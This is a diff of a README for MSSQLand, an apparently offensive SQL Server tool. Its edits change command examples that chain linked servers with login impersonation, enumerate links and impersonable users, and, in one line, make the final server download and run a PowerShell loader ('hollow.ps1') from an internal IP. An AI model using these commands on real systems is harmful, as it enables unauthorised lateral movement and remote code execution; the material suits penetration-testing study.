@@ -9,7 +9,7 @@ MSSQLand is your ultimate tool for interacting with [Microsoft SQL Server (MSSQL
 
 The tool's precise and structured output, enriched with timestamps and valuable contextual information, is designed to produce visually appealing and professional results, making it ideal for capturing high-quality screenshots for your reports. For example, running this command:
 ```shell
-MSSQLand.exe /h:SQL01:Moulinier /u:Jacquard /p:Fr@nce!1940%Tr1c /c:local /l:SQL02:webapp03,SQL03:webapp04,SQL04:Merlaux /a:tables balard
+.\MSSQLand.exe /h:SQL01:Moulinier /u:Jacquard /p:"Fr@nce1940/Gaulle" /c:local /l:SQL02:webapp03,SQL03:webapp04,SQL04:Merlaux /a:tables balard
 ```
 
 Create the following output:
@@ -93,7 +93,7 @@ EXEC ('EXECUTE AS LOGIN = ''webapp03''; EXEC (''EXECUTE AS LOGIN = ''''webapp04'
 No thanks 🚫. Let MSSQLand handle the heavy lifting so you can focus on the big picture. You've already impersonated multiple users on each hop, and now you want to enumerate links on `SQL04`:
 
 ```shell
-MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:links
+.\MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:links
 ```
 
 The output is as follows:
@@ -125,7 +125,7 @@ The output is as follows:
 
 Now you want to verify who you can impersonate at the end of the chain:
 ```shell
-MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:impersonate
+.\MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:impersonate
 ```
 The output shows:
 
@@ -159,7 +159,7 @@ The output shows:
 
 Great! Now you can directly reach out to your loader with:
 ```shell
-MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:MarieJo /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
+.\MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:MarieJo /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
 ```
 
 Or even use Common Language Runtime (CLR) to load remotely a library with:
